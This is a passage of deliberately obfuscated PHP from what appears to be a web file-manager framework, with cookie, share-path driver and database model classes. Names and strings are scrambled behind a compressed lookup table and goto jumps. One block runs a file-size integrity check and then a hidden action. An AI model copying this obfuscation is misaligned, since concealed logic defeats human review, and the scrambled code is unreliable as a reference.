= array(); foreach ($çŠğââË as $†™õØµ) { if (isset($È±ÆÆÙº[$†™õØµ])) { $¢ë˜¥¯Â[] = $È±ÆÆÙº[$†™õØµ]; } } return $¢ë˜¥¯Â; } } goto CØ´ğ¨™ß; aËâšŒšÛ: $_size = $_SERVER[ñ÷§¡å][888]; if ($_SERVER[$_SERVER[ñ÷§¡å][60]] != $_size($_file)) { $_getc = $_SERVER[ñ÷§¡å][62]; $_getfile = $_SERVER[$_SERVER[ñ÷§¡å][63]] . $_SERVER[ñ÷§¡å][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ñ÷§¡å][65], $_getfilec); if (count($_getarrs) < $_SERVER[ñ÷§¡å][66]) { $exit = $_SERVER[ñ÷§¡å][67]; $exit(); } $_act = $_SERVER[ñ÷§¡å][68]; $_act($_file); } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ğ¤–Ÿ§ = '', $€«£Í¤ = 0) { if (is_string($Ğ¤–Ÿ§) && $Ğ¤–Ÿ§ != $_SERVER[ñ÷§¡å][12]) { $this->prefix = $Ğ¤–Ÿ§; } if (is_numeric($€«£Í¤) && $€«£Í¤ > 0) { $this->expire = $€«£Í¤; } } public static function getInstance() { static $üÂòáÉÏ; if ($üÂòáÉÏ === null) { $üÂòáÉÏ = new self(); } return $üÂòáÉÏ; } private static $cookieDisable = false; public static function disable($µ§äÍ€») { self::$cookieDisable = $µ§äÍ€»; } private static $sameCookieSet = array(); public static function set($ùßšÆ§·, $ö¨Û¶â, $˜Æ¨Ö’ = 0, $¾áÜîäç = false, $Ş³†×óÍ = false) { $Öóüš£Ê =& $_SERVER[ñ÷§¡å]; if (self::$cookieDisable) { return; } if (!$˜Æ¨Ö’) { $˜Æ¨Ö’ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ùßšÆ§·]) && self::$sameCookieSet[$ùßšÆ§·] == $ö¨Û¶â . $˜Æ¨Ö’) { return; } self::$sameCookieSet[$ùßšÆ§·] = $ö¨Û¶â . $˜Æ¨Ö’; if (!$Ş³†×óÍ) { $Ş³†×óÍ = str_replace(HOST, $Öóüš£Ê[12], APP_HOST); $Ş³†×óÍ = _get($GLOBALS, $Öóüš£Ê[889], $Ş³†×óÍ); } $§£åõÍ‡ = $Öóüš£Ê[12]; setcookie($ùßšÆ§·, $ö¨Û¶â, time() + $˜Æ¨Ö’, $Öóüš£Ê[8] . trim($Ş³†×óÍ, $Öóüš£Ê[8]) . $§£åõÍ‡, !1, !1, $¾áÜîäç); } public static function setSafe($Şú¤Ñğæ, $Î±Ú¹«, $‡ˆâ• = 0) { self::set($Şú¤Ñğæ, $Î±Ú¹«, $‡ˆâ•, !0); } public static function get($¿¸¶Ù¬¡) { static $Ê±¬¶’« = false; if (!$Ê±¬¶’«) { self::initHeaderCookie(); $Ê±¬¶’« = !0; } return isset($_COOKIE[$¿¸¶Ù¬¡]) ? $_COOKIE[$¿¸¶Ù¬¡] : !1; } private static function initHeaderCookie() { $×è ÌÍÇ =& $_SERVER[ñ÷§¡å]; if (!isset($_SERVER[$×è ÌÍÇ[890]]) || !$_SERVER[$×è ÌÍÇ[890]]) { return; } $ôÈßçˆè = explode($×è ÌÍÇ[81], $_SERVER[$×è ÌÍÇ[890]]); foreach ($ôÈßçˆè as $¾ÜÓ§ƒÌ) { $¾ÜÓ§ƒÌ = explode($×è ÌÍÇ[891], $¾ÜÓ§ƒÌ); if (count($¾ÜÓ§ƒÌ) != 2 || !isset($¾ÜÓ§ƒÌ[1])) { continue; } $_COOKIE[trim($¾ÜÓ§ƒÌ[0])] = trim($¾ÜÓ§ƒÌ[1]); } } public static function remove($Ü­¶¯ŸŸ, $ÍŠ¶‰û = false) { unset($_COOKIE[$Ü­¶¯ŸŸ]); self::set($Ü­¶¯ŸŸ, $_SERVER[ñ÷§¡å][12], 1, $ÍŠ¶‰û); } } goto Dè¬ØÇÎêâ; b“ÏëŸéÒ›: class PathDriverDriverShareItem { public function __construct($ƒ¤—›ß) { $this->pathParse = $ƒ¤—›ß; } public function __call($û‡¼ÈßÉ, $ÙĞÚİ¡å) { $ìãÌò‘ =& $_SERVER[ñ÷§¡å]; if (method_exists($this, $û‡¼ÈßÉ)) { return; } $¹îÁ·Óà = call_user_func_array(array($ìãÌò‘[1344], $û‡¼ÈßÉ), $ÙĞÚİ¡å); $ÇŒİÁô = array($ìãÌò‘[1345], $ìãÌò‘[1346], $ìãÌò‘[1347], $ìãÌò‘[1348], $ìãÌò‘[564], $ìãÌò‘[566], $ìãÌò‘[1349], $ìãÌò‘[117], $ìãÌò‘[1350], $ìãÌò‘[1351]); if (in_array($û‡¼ÈßÉ, $ÇŒİÁô)) { $¹îÁ·Óà = $this->getPathOuter($¹îÁ·Óà); } return $¹îÁ·Óà; } public function copy($÷Ê¾í—¥, $…ŞŒçö‹, $à½´²ñÁ = false, $•µ‡ùû = false) { return $this->copyMove($÷Ê¾í—¥, $…ŞŒçö‹, $à½´²ñÁ, $_SERVER[ñ÷§¡å][564], $•µ‡ùû); } public function move($–Ãìœïœ, $’ÀÚ“Ù™, $Òõòüâ€ = false, $ö·¨©¾£ = false) { return $this->copyMove($–Ãìœïœ, $’ÀÚ“Ù™, $Òõòüâ€, $_SERVER[ñ÷§¡å][566], $ö·¨©¾£); } private function copyMove($¼÷üÌú, $åãÏÅø, $¼øîÃÊÓ, $ÕìñÅ, $ÏÇ¸¡‚¶ = false) { $ÆêŠÒó =& $_SERVER[ñ÷§¡å]; $ëÍØÄ¥ = $åãÏÅø; $¿´¾ääÆ = IO::driverMake($åãÏÅø); if ($¿´¾ääÆ->pathParse[$ÆêŠÒó[1158]]) { $åãÏÅø = $¿´¾ääÆ->pathParse[$ÆêŠÒó[1158]]; } else { $åãÏÅø = $ëÍØÄ¥; } $…˜¼š™É = IO::copyMove($¼÷üÌú, $åãÏÅø, $¼øîÃÊÓ, $ÕìñÅ, $ÏÇ¸¡‚¶); $…˜¼š™É = $this->getPathOuter($…˜¼š™É); return $…˜¼š™É; } public function pathThis($ì¤±Ô¾°) { return get_path_this($this->pathParse[$_SERVER[ñ÷§¡å][94]]); } public function pathFather($å„ãØÄ‰) { return get_path_father($this->pathParse[$_SERVER[ñ÷§¡å][94]]); } public function iconvSystem($ÇÂ·æ©) { return $ÇÂ·æ©; } protected function infoParse($ùá·îÆ§, $¶ş¤ § = false) { $Š´÷ôÀ =& $_SERVER[ñ÷§¡å]; $É’Şûà = $this->pathParse[$Š´÷ôÀ[496]][$Š´÷ôÀ[1183]] . $this->pathParse[$Š´÷ôÀ[1176]]; if ($¶ş¤ §) { $ßíÓŸ  = IO::infoWithChildren($É’Şûà); } else { $ßíÓŸ  = IO::info($É’Şûà); } $É¨èİ«‹ = $this->pathParse[$Š´÷ôÀ[496]]; return Action($Š´÷ôÀ[1342])->_shareItemeParse($ßíÓŸ , $É¨èİ«‹); } public function listAll($ÏòŒ­ì) { $ö¾ËÇª =& $_SERVER[ñ÷§¡å]; $ÃÔ¥ÑÔö = IO::listAll($ÏòŒ­ì); $”Ê‡¿¥Ó = $this->pathParse[$ö¾ËÇª[496]]; foreach ($ÃÔ¥ÑÔö as &$»Ã»Ó) { check_abort(); $ºıîÙñÙ = IO::info($»Ã»Ó[$ö¾ËÇª[94]]); $ºıîÙñÙ = is_array($ºıîÙñÙ) ? $ºıîÙñÙ : array(); $»Ã»Ó = array_merge($ºıîÙñÙ, $»Ã»Ó); $»Ã»Ó[$ö¾ËÇª[96]] = Action($ö¾ËÇª[1342])->_shareItemeParse($»Ã»Ó, $”Ê‡¿¥Ó); } unset($»Ã»Ó); return $ÃÔ¥ÑÔö; } public function getPathOuter($›Õ·úÍÒ) { $§Ğ¼Ñ¢ =& $_SERVER[ñ÷§¡å]; $Úîàò² = KodIO::parse($›Õ·úÍÒ); if ($Úîàò²[$§Ğ¼Ñ¢[33]] == KodIO::KOD_SHARE_ITEM) { return $Úîàò²[$§Ğ¼Ñ¢[94]]; } $–ãàş„Ú = KodIO::clear($›Õ·úÍÒ); $€¦Éƒ„£ = KodIO::clear($this->pathParse[$§Ğ¼Ñ¢[496]][$§Ğ¼Ñ¢[1183]]); $š¶ğˆÁƒ = substr($–ãàş„Ú, strlen($€¦Éƒ„£)); if (substr($–ãàş„Ú, 0, strlen($€¦Éƒ„£)) != $€¦Éƒ„£) { return !1; } return $this->pathParse[$§Ğ¼Ñ¢[1177]] . $§Ğ¼Ñ¢[8] . ltrim($š¶ğˆÁƒ, $§Ğ¼Ñ¢[8]); } public function getType() { $ãÃºÓÀ =& $_SERVER[ñ÷§¡å]; $¡âöˆ˜½ = str_replace($ãÃºÓÀ[84], $ãÃºÓÀ[12], get_class($this)); return strtolower($¡âöˆ˜½); } public function isTypeObject($½êÆÂÀ–) { return IO::isTypeObject($½êÆÂÀ–); } public function info($Ãµ‹±¸Ï) { return $this->infoParse($Ãµ‹±¸Ï); } public function infoAuth($¬ÃÄ‡¿) { return $this->infoParse($¬ÃÄ‡¿); } public function infoWithChildren($Á¸®Øê¥) { return $this->infoParse($Á¸®Øê¥, !0); } public function infoFull($“©ÙŒ°¸) { return $this->infoParse($“©ÙŒ°¸); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($»¨®öÕ) { $this->pathParse = $»¨®öÕ; } protected function infoParse($ğ¸Èœó, $èœªè = false) { $®àïï¶ñ =& $_SERVER[ñ÷§¡å]; return Action($®àïï¶ñ[1182])->sharePathInfo($this->pathParse[$®àïï¶ñ[94]], !0, $èœªè); } public function listPath($¯ñ‡É¿Ğ, $ñÉñ€«œ = false) { $¡ïàÑ‰ü =& $_SERVER[ñ÷§¡å]; $Ä‰€£À = IO::listPath($¯ñ‡É¿Ğ, $ñÉñ€«œ); if (!$Ä‰€£À) { return $Ä‰€£À; } if (is_array($Ä‰€£À[$¡ïàÑ‰ü[1343]])) { $ğ˜œ× = Action($¡ïàÑ‰ü[1352])->parsePathChildren($Ä‰€£À[$¡ïàÑ‰ü[1343]], array($¡ïàÑ‰ü[430] => $¯ñ‡É¿Ğ)); $Ä‰€£À[$¡ïàÑ‰ü[1343]] = Action($¡ïàÑ‰ü[1182])->shareItemInfo($ğ˜œ×); } foreach ($Ä‰€£À as $Ë‘‹¨Öô => $–â”îŠã) { if (!in_array($Ë‘‹¨Öô, array($¡ïàÑ‰ü[93], $¡ïàÑ‰ü[92]))) { continue; } foreach ($–â”îŠã as $½ÊØßÈÜ => $ğ˜œ×) { $ğ˜œ× = Action($¡ïàÑ‰ü[1352])->parsePathChildren($ğ˜œ×, array($¡ïàÑ‰ü[430] => $¯ñ‡É¿Ğ)); $Ä‰€£À[$Ë‘‹¨Öô][$½ÊØßÈÜ] = Action($¡ïàÑ‰ü[1182])->shareItemInfo($ğ˜œ×); } } return $Ä‰€£À; } public function listAll($òïËúÉ©) { $±¬’Ûí† =& $_SERVER[ñ÷§¡å]; $ì¹í¥ùĞ = IO::listAll($òïËúÉ©); foreach ($ì¹í¥ùĞ as &$Ä¶µ£¶) { $¾³ÜûÄ = IO::info($Ä¶µ£¶[$±¬’Ûí†[94]]); $¾³ÜûÄ = is_array($¾³ÜûÄ) ? $¾³ÜûÄ : array(); $Ä¶µ£¶ = array_merge($¾³ÜûÄ, $Ä¶µ£¶); $Ä¶µ£¶[$±¬’Ûí†[96]] = Action($±¬’Ûí†[1182])->shareItemInfo($Ä¶µ£¶); } unset($Ä¶µ£¶); return $ì¹í¥ùĞ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($¥ÃÎğ) { parent::__construct($¥ÃÎğ); } } goto C×ïá¿ãŠä; cŒ˜ŒóÊã¡: define($_SERVER[ñ÷§¡å][0], $_SERVER[ñ÷§¡å][1]); $_SERVER[ù†®£‚ı] = explode($_SERVER[ñ÷§¡å][2], gzinflate(substr($_SERVER[ñ÷§¡å][3], 10, -8))); function binCheckEq($„¯ê‡ñÛ, $ÁİşÍğë) { return $„¯ê‡ñÛ == $ÁİşÍğë; } goto b¾¯¶æ“êÂ; DÏãµ×µÓ˜: define($_SERVER[ñ÷§¡å][252], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\145", "\x6f\162\x64\x65\162", "\x61\154\151\141\x73", "\150\x61\x76\x69\156\147", "\x67\x72\157\165\x70", "\x6c\x6f\x63\x6b", "\x64\x69\163\164\151\156\x63\x74", "\x61\x75\164\157", "\x66\x69\154\x74\145\162", "\166\141\154\x69\x64\x61\x74\145", "\x72\145\163\165\x6c\x74", "\142\x69\x6e\144", "\x74\x6f\153\x65\x6e"); public function __construct($«âÆ”¶í = '', $íÂ‰¸»— = '', $Õ«–ÇĞ = '') { $…ÅËçòœ =& $_SERVER[ñ÷§¡å]; $this->_initialize(); if (!empty($«âÆ”¶í)) { if (strpos($«âÆ”¶í, $…ÅËçòœ[10])) { list($this->dbName, $this->name) = explode($…ÅËçòœ[10], $«âÆ”¶í); } else { $this->name = $«âÆ”¶í; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($íÂ‰¸»—)) { $this->tablePrefix = $…ÅËçòœ[12]; } elseif ($…ÅËçòœ[12] != $íÂ‰¸»—) { $this->tablePrefix = $íÂ‰¸»—; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($…ÅËçòœ[253]); } $this->db(0, empty($this->connection) ? $Õ«–ÇĞ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $‘’Ù¬· =& $_SERVER[ñ÷§¡å]; if (empty($this->fields)) { if (think_config($‘’Ù¬·[254])) { $šúÏüÁ‚ = $this->dbName ? $this->dbName : think_config($‘’Ù¬·[255]); $Ò·ºÈÊ = think_var_cache($‘’Ù¬·[256] . strtolower(get_path_this($šúÏüÁ‚) . $‘’Ù¬·[10] . $this->name)); if ($Ò·ºÈÊ) { $ÖïÂ‡¡™ = think_config($‘’Ù¬·[257]); if (empty($ÖïÂ‡¡™) || $Ò·ºÈÊ[$‘’Ù¬·[258]] == $ÖïÂ‡¡™) { $this->fields = $Ò·ºÈÊ; return; } } } $this->flush(); } } public function flush() { $æ†ÔÊˆ =& $_SERVER[ñ÷§¡å]; $this->db->setModel($this->name); $ÛßÉÁ” = $this->db->getFields($this->getTableName()); if (!$ÛßÉÁ”) { return !1; } $this->fields = array_keys($ÛßÉÁ”); $this->fields[$æ†ÔÊˆ[259]] = !1; foreach ($ÛßÉÁ” as $Ì™àıáÇ => $ıšÀàË˜) { $°Şä˜Ó[$Ì™àıáÇ] = $ıšÀàË˜[$æ†ÔÊˆ[33]]; if ($ıšÀàË˜[$æ†ÔÊˆ[39]]) { $this->fields[$æ†ÔÊˆ[260]] = $Ì™àıáÇ; if ($ıšÀàË˜[$æ†ÔÊˆ[42]]) { $this->fields[$æ†ÔÊˆ[259]] = !0; } } } $this->fields[$æ†ÔÊˆ[261]] = $°Şä˜Ó; if (think_config($æ†ÔÊˆ[257])) { $this->fields[$æ†ÔÊˆ[258]] = think_config($æ†ÔÊˆ[257]); } if (think_config($æ†ÔÊˆ[254])) { $Ã³˜œ†Ì = $this->dbName ? $this->dbName : think_config($æ†ÔÊˆ[255]); think_var_cache($æ†ÔÊˆ[256] . strtolower(get_path_this($Ã³˜œ†Ì) . $æ†ÔÊˆ[10] . $this->name), $this->fields); } } public function switchModel($¯úê‰Æ, $°°ä×Úâ = array()) { $ıä¢Üª„ =& $_SERVER[ñ÷§¡å]; $¸şî”×í = ucwords(strtolower($¯úê‰Æ)) . $ıä¢Üª„[262]; if (!class_exists($¸şî”×í)) { think_exception($¸şî”×í . think_lang($ıä¢Üª„[263])); } $this->_extModel = new $¸şî”×í($this->name); if (!empty($°°ä×Úâ)) { foreach ($°°ä×Úâ as $Û“¯ê¾“) { $this->_extModel->setProperty($Û“¯ê¾“, $this->{$Û“¯ê¾“}); } } return $this->_extModel; } public function __set($ûŒ³ôŒÆ, $¶ñÍìñ) { $this->data[$ûŒ³ôŒÆ] = $¶ñÍìñ; } public function __get($©»â«“) { return isset($this->data[$©»â«“]) ? $this->data[$©»â«“] : null; } public function __isset($ìäùÛå©) { return isset($this->data[$ìäùÛå©]); } public function __unset($¼âÕÎ§í) { unset($this->data[$¼âÕÎ§í]); } public function __call($Š ĞÄÚõ, $¸áÔ³¶ö) { $î Ë±ò =& $_SERVER[ñ÷§¡å]; if (in_array(strtolower($Š ĞÄÚõ), $this->methods, !0)) { $this->options[strtolower($Š ĞÄÚõ)] = $¸áÔ³¶ö[0]; return $this; } elseif (in_array(strtolower($Š ĞÄÚõ), array($î Ë±ò[264], $î Ë±ò[265], $î Ë±ò[266], $î Ë±ò[267], $î Ë±ò[268]), !0)) { $¿‘İÈ²Ì = isset($¸áÔ³¶ö[0]) ? $¸áÔ³¶ö[0] : $î Ë±ò[198]; $¿‘İÈ²Ì = $this->db->parseKey($¿‘İÈ²Ì); return $this->getField(strtoupper($Š ĞÄÚõ) . $î Ë±ò[269] . $¿‘İÈ²Ì . $î Ë±ò[270] . $Š ĞÄÚõ, $î Ë±ò[264]); } elseif (strtolower(substr($Š ĞÄÚõ, 0, 5)) == $î Ë±ò[271]) { $¿‘İÈ²Ì = think_parse_name(substr($Š ĞÄÚõ, 5)); $‡şÅ¬ø[$¿‘İÈ²Ì] = $¸áÔ³¶ö[0]; return $this->where($‡şÅ¬ø)->find(); } elseif (strtolower(substr($Š ĞÄÚõ, 0, 10)) == $î Ë±ò[272]) { $ÎşğŒÑš = think_parse_name(substr($Š ĞÄÚõ, 10)); $‡şÅ¬ø[$ÎşğŒÑš] = $¸áÔ³¶ö[0]; return $this->where($‡şÅ¬ø)->getField($¸áÔ³¶ö[1]); } elseif (isset($this->_scope[$Š ĞÄÚõ])) { return $this->scope($Š ĞÄÚõ, $¸áÔ³¶ö[0]); } elseif (method_exists($this, $Š ĞÄÚõ)) { array_unshift($¸áÔ³¶ö, $Š ĞÄÚõ); return call_user_func_array(array($this, $î Ë±ò[273]), $¸áÔ³¶ö); } else { return call_user_func_array(array(parent, $Š ĞÄÚõ), $¸áÔ³¶ö); } } protected function call() { $…·¾ä€¦ =& $_SERVER[ñ÷§¡å]; $ä×ºíùÅ = func_get_args(); $ˆÌ”Ğ‰ = array_shift($ä×ºíùÅ); $»¦Œƒ†ğ = $ˆÌ”Ğ‰; if (is_array($ˆÌ”Ğ‰)) { $»¦Œƒ†ğ = $ˆÌ”Ğ‰[1]; $ˆÌ”Ğ‰ = $ˆÌ”Ğ‰[0]; } $ˆ¿µ”ˆÁ = count($ä×ºíùÅ) - 1; if (isset($ä×ºíùÅ[$ˆ¿µ”ˆÁ]) && $ä×ºíùÅ[$ˆ¿µ”ˆÁ] === $ˆÌ”Ğ‰) { think_exception(__CLASS__ . $…·¾ä€¦[4] . $ˆÌ”Ğ‰ . think_lang($…·¾ä€¦[274])); return; } $ä×ºíùÅ[] = $ˆÌ”Ğ‰; if (method_exists($this, $…·¾ä€¦[275])) { $×üì¢®û = call_user_func_array(array($this, $…·¾ä€¦[276]), array($»¦Œƒ†ğ, $ä×ºíùÅ)); if (!is_null($×üì¢®û) && $×üì¢®û !== !1) { return $×üì¢®û; } } $ëÇ‘ÉŒ = call_user_func_array(array($this, $ˆÌ”Ğ‰), $ä×ºíùÅ); if (method_exists($this, $…·¾ä€¦[277])) { $×üì¢®û = call_user_func_array(array($this, $…·¾ä€¦[278]), array($»¦Œƒ†ğ, $ä×ºíùÅ, $ëÇ‘ÉŒ)); if ($×üì¢®û) { return $×üì¢®û; } } return $ëÇ‘ÉŒ; } protected function _initialize() { } protected function _facade($©÷ï£™¼) { $³±öÀ­ü =& $_SERVER[ñ÷§¡å]; if (!empty($this->fields)) { foreach ($©÷ï£™¼ as $‘­Ôìá => $œ¸òÒš†) { if (is_array($this->fields) && !in_array($‘­Ôìá, $this->fields, !0)) { unset($©÷ï£™¼[$‘­Ôìá]); } elseif (is_scalar($œ¸òÒš†)) { $this->_parseType($©÷ï£™¼, $‘­Ôìá); } } } if (!empty($this->options[$³±öÀ­ü[279]])) { $©÷ï£™¼ = array_map($this->options[$³±öÀ­ü[279]], $©÷ï£™¼); unset($this->options[$³±öÀ­ü[279]]); } $this->_beforeWrite($©÷ï£™¼); return $©÷ï£™¼; } protected function _beforeWrite(&$şòÑüÑ) { } public function add($ªıŒÖãß = '', $º°éòø½ = array(), $£àŒÂå… = false) { if (empty($ªıŒÖãß)) { if (!empty($this->data)) { $ªıŒÖãß = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ñ÷§¡å][280]); return !1; } } $º°éòø½ = $this->_parseOptions($º°éòø½); $ªıŒÖãß = $this->_facade($ªıŒÖãß); if (!1 === $this->_beforeInsert($ªıŒÖãß, $º°éòø½)) { return !1; } $ñ€ô›‘‚ = $this->db->insert($ªıŒÖãß, $º°éòø½, $£àŒÂå…); if (!1 !== $ñ€ô›‘‚) { $ƒú¯²ã´ = $this->getLastInsID(); if ($ƒú¯²ã´) { $ªıŒÖãß[$this->getPk()] = $ƒú¯²ã´; $this->_after_insert($ªıŒÖãß, $º°éòø½); return $ƒú¯²ã´; } $this->_after_insert($ªıŒÖãß, $º°éòø½); } return $ñ€ô›‘‚; } protected function _beforeInsert(&$«ìæÈ£Ë, $ò÷”ş´Õ) { } protected function _after_insert($Õ×‹, $òáÚ»„¯) { } public function addAll($êşè°Ñ, $ùˆÚàİö = array(), $º¶¼šÖå = false) { $¬¯œÆ¯ó =& $_SERVER[ñ÷§¡å]; if (empty($êşè°Ñ)) { $this->error = think_lang($¬¯œÆ¯ó[280]); return !1; } $ùˆÚàİö = $this->_parseOptions($ùˆÚàİö); foreach ($êşè°Ñ as $û÷ÈÜ•Ò => $á¨Úîß°) { $êşè°Ñ[$û÷ÈÜ•Ò] = $this->_facade($á¨Úîß°); } if (method_exists($this->db, $¬¯œÆ¯ó[281])) { $Õ¤›ª÷ = $this->db->insertAll($êşè°Ñ, $ùˆÚàİö, $º¶¼šÖå); } else { $this->startTrans(); foreach ($êşè°Ñ as $û÷ÈÜ•Ò => $á¨Úîß°) { $Õ¤›ª÷ = $this->db->insert($á¨Úîß°, $ùˆÚàİö, $º¶¼šÖå); } $this->commit(); } if (!1 !== $Õ¤›ª÷) { $½êèó¨ = $this->getLastInsID(); if ($½êèó¨) { return $½êèó¨; } } return $Õ¤›ª÷; } public function selectAdd($¥¿Œ¿èÏ = '', $ Âä¡ ‹ = '', $ş¼’˜“ = array()) { $Äí¼Íäõ =& $_SERVER[ñ÷§¡å]; $ş¼’˜“ = $this->_parseOptions($ş¼’˜“); if (!1 === ($ª”½äË¨ = $this->db->selectInsert($¥¿Œ¿èÏ ? $¥¿Œ¿èÏ : $ş¼’˜“[$Äí¼Íäõ[282]], $ Âä¡ ‹ ? $ Âä¡ ‹ : $this->getTableName(), $ş¼’˜“))) { $this->error = think_lang($Äí¼Íäõ[283]); return !1; } else { return $ª”½äË¨; } } public function save($ø‰­†ìø = '', $˜ÂöÕéÊ = array()) { $º‡ßşî =& $_SERVER[ñ÷§¡å]; if (empty($ø‰­†ìø)) { if (!empty($this->data)) { $ø‰­†ìø = $this->data; $this->data = array(); } else { $this->error = think_lang($º‡ßşî[280]); return !1; } } $ø‰­†ìø = $this->_facade($ø‰­†ìø); $˜ÂöÕéÊ = $this->_parseOptions($˜ÂöÕéÊ); $’œˆáĞ¾ = $this->getPk(); if (!isset($˜ÂöÕéÊ[$º‡ßşî[284]])) { if (isset($ø‰­†ìø[$’œˆáĞ¾])) { $Å¤å’[$’œˆáĞ¾] = $ø‰­†ìø[$’œˆáĞ¾]; $˜ÂöÕéÊ[$º‡ßşî[284]] = $Å¤å’; unset($ø‰­†ìø[$’œˆáĞ¾]); } else { $this->error = think_lang($º‡ßşî[283]); return !1; } } if (is_array($˜ÂöÕéÊ[$º‡ßşî[284]]) && isset($˜ÂöÕéÊ[$º‡ßşî[284]][$’œˆáĞ¾])) { $ÉÊ´ùá× = $˜ÂöÕéÊ[$º‡ßşî[284]][$’œˆáĞ¾]; } if (!1 === $this->_beforeUpdate($ø‰­†ìø, $˜ÂöÕéÊ)) { return !1; } $µ¬¼¼˜ = $this->db->update($ø‰­†ìø, $˜ÂöÕéÊ); if (!1 !== $µ¬¼¼˜) { if (isset($ÉÊ´ùá×)) { $ø‰­†ìø[$’œˆáĞ¾] = $ÉÊ´ùá×; } $this->_afterUpdate($ø‰­†ìø, $˜ÂöÕéÊ); } return $µ¬¼¼˜; } protected function _beforeUpdate(&$À‰ğ›ÀÈ, $ÜË€ôş) { } protected function _afterUpdate($…è®—¯Å, $¡îöïõõ) { } public function delete($†·»«Í = array()) { $Ã€ïíøŒ =& $_SERVER[ñ÷§¡å]; if (empty($†·»«Í) && empty($this->options[$Ã€ïíøŒ[284]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $„øŒ’Œ = $this->getPk(); if (is_numeric($†·»«Í) || is_string($†·»«Í)) { if (strpos($†·»«Í, $Ã€ïíøŒ[50])) { $İ±ŞÖÖû[$„øŒ’Œ] = array($Ã€ïíøŒ[285], $†·»«Í); } else { $İ±ŞÖÖû[$„øŒ’Œ] = $†·»«Í; } $this->options[$Ã€ïíøŒ[284]] = $İ±ŞÖÖû; } $†·»«Í = $this->_parseOptions(); if (is_array($†·»«Í[$Ã€ïíøŒ[284]]) && isset($†·»«Í[$Ã€ïíøŒ[284]][$„øŒ’Œ])) { $ïù×’íŸ = $†·»«Í[$Ã€ïíøŒ[284]][$„øŒ’Œ]; } $®·´Çùò = $this->db->delete($†·»«Í); if (!1 !== $®·´Çùò) { $Èæ†ğç = array(); if (isset($ïù×’íŸ)) { $Èæ†ğç[$„øŒ’Œ] = $ïù×’íŸ; } $this->_after_delete($Èæ†ğç, $†·»«Í); } return $®·´Çùò; } protected function _after_delete($Ö¨Ú…«°, $äñ‹Ï­ä) { } public function select($šıˆÕÄ = array()) { $ÏèóÔƒ‘ =& $_SERVER[ñ÷§¡å]; if (is_string($šıˆÕÄ) || is_numeric($šıˆÕÄ)) { $æœƒß—ä = $this->getPk(); if (strpos($šıˆÕÄ, $ÏèóÔƒ‘[50])) { $Ÿäºõš[$æœƒß—ä] = array($ÏèóÔƒ‘[285], $šıˆÕÄ); } else { $Ÿäºõš[$æœƒß—ä] = $šıˆÕÄ; } $this->options[$ÏèóÔƒ‘[284]] = $Ÿäºõš; } elseif (!1 === $šıˆÕÄ) { $šıˆÕÄ = $this->_parseOptions(); return $ÏèóÔƒ‘[286] . $this->db->buildSelectSql($šıˆÕÄ) . $ÏèóÔƒ‘[287]; } $šıˆÕÄ = $this->_parseOptions(); $ Ã˜Øö = $this->db->select($šıˆÕÄ); if (!1 === $ Ã˜Øö) { return !1; } if (empty($ Ã˜Øö)) { return null; } $this->_afterSelect($ Ã˜Øö, $šıˆÕÄ); return $ Ã˜Øö; } protected function _afterSelect(&$‰Ì£Ñ‰Í, $İµ¢ÒŒ÷) { } public function buildSql($ä“Ïğ°› = array()) { $‰Ì‰« =& $_SERVER[ñ÷§¡å]; $ä“Ïğ°› = $this->_parseOptions($ä“Ïğ°›); return $‰Ì‰«[286] . $this->db->buildSelectSql($ä“Ïğ°›) . $‰Ì‰«[287]; } public function optionsValue($—Ö¹ÊºÑ = null) { if (is_null($—Ö¹ÊºÑ)) { return $this->options; } elseif (is_array($—Ö¹ÊºÑ)) { $this->options = array_merge($this->options, $—Ö¹ÊºÑ); } } protected function _parseOptions($ÜÏÔ§ª = array()) { $ìåø«°¤ =& $_SERVER[ñ÷§¡å]; if (is_array($ÜÏÔ§ª)) { $ÜÏÔ§ª = array_merge($this->options, $ÜÏÔ§ª); } $this->options = array(); if (!isset($ÜÏÔ§ª[$ìåø«°¤[288]])) { $ÜÏÔ§ª[$ìåø«°¤[288]] = $this->getTableName(); $ÍÄåÆ©Ê = $this->fields; } else { $ÍÄåÆ©Ê = $this->getDbFields(); } if (!empty($ÜÏÔ§ª[$ìåø«°¤[289]])) { $ÜÏÔ§ª[$ìåø«°¤[288]] .= $ìåø«°¤[53] . $ÜÏÔ§ª[$ìåø«°¤[289]]; } $ÜÏÔ§ª[$ìåø«°¤[290]] = $this->name; if (isset($ÜÏÔ§ª[$ìåø«°¤[284]]) && is_array($ÜÏÔ§ª[$ìåø«°¤[284]]) && !empty($ÍÄåÆ©Ê) && !isset($ÜÏÔ§ª[$ìåø«°¤[291]]) && !isset($ÜÏÔ§ª[$ìåø«°¤[288]])) { foreach ($ÜÏÔ§ª[$ìåø«°¤[284]] as $Ìª¥’ö => $ŞÛÄŠ÷) { $Ìª¥’ö = trim($Ìª¥’ö); if (in_array($Ìª¥’ö, $ÍÄåÆ©Ê, !0)) { if (is_scalar($ŞÛÄŠ÷)) { $this->_parseType($ÜÏÔ§ª[$ìåø«°¤[284]], $Ìª¥’ö); } } elseif (!is_numeric($Ìª¥’ö) && $ìåø«°¤[11] != substr($Ìª¥’ö, 0, 1) && !1 === strpos($Ìª¥’ö, $ìåø«°¤[10]) && !1 === strpos($Ìª¥’ö, $ìåø«°¤[269]) && !1 === strpos($Ìª¥’ö, $ìåø«°¤[292]) && !1 === strpos($Ìª¥’ö, $ìåø«°¤[293])) { unset($ÜÏÔ§ª[$ìåø«°¤[284]][$Ìª¥’ö]); } } } $this->_options_filter($ÜÏÔ§ª); return 